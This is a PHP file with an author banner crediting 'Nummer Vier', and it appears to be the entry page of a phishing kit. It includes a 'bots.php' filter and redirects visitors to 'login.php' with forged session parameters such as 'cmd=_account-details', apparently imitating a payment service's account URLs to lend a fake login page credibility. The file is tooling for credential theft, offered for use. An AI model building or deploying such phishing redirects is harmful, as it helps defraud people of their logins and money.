<?php
/*

NNNNNNNN        NNNNNNNN                        VVVVVVVV           VVVVVVVV iiii                                          
N:::::::N       N::::::N                        V::::::V           V::::::Vi::::i                                         
N::::::::N      N::::::N                        V::::::V           V::::::V iiii                                          
N:::::::::N     N::::::N                        V::::::V           V::::::V                                               
N::::::::::N    N::::::N                         V:::::V           V:::::Viiiiiii     eeeeeeeeeeee    rrrrr   rrrrrrrrr   
N:::::::::::N   N::::::N                          V:::::V         V:::::V i:::::i   ee::::::::::::ee  r::::rrr:::::::::r  
N:::::::N::::N  N::::::N                           V:::::V       V:::::V   i::::i  e::::::eeeee:::::eer:::::::::::::::::r 
N::::::N N::::N N::::::N                            V:::::V     V:::::V    i::::i e::::::e     e:::::err::::::rrrrr::::::r
N::::::N  N::::N:::::::N                             V:::::V   V:::::V     i::::i e:::::::eeeee::::::e r:::::r     r:::::r
N::::::N   N:::::::::::N                              V:::::V V:::::V      i::::i e:::::::::::::::::e  r:::::r     rrrrrrr
N::::::N    N::::::::::N                               V:::::V:::::V       i::::i e::::::eeeeeeeeeee   r:::::r            
N::::::N     N:::::::::N                                V:::::::::V        i::::i e:::::::e            r:::::r            
N::::::N      N::::::::N                                 V:::::::V        i::::::ie::::::::e           r:::::r            
N::::::N       N:::::::N                                  V:::::V         i::::::i e::::::::eeeeeeee   r:::::r            
N::::::N        N::::::N                                   V:::V          i::::::i  ee:::::::::::::e   r:::::r            
NNNNNNNN         NNNNNNN                                    VVV           iiiiiiii    eeeeeeeeeeeeee   rrrrrrr            
                        ________________________                                                                          
                        _::::::::::::::::::::::_                                                                          
                        ________________________                                                                   
####################################################################
#                                                                  #
#                  ||~~ BY ~~ Nummer Vier ~~||                     #
#                                                                  #
#       ||~ http://fb.com/profile.php?id=100013164673156 ~||       #
#                                                                  #
####################################################################                                                                                                    
*/
include "bots.php";
header("location: login.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>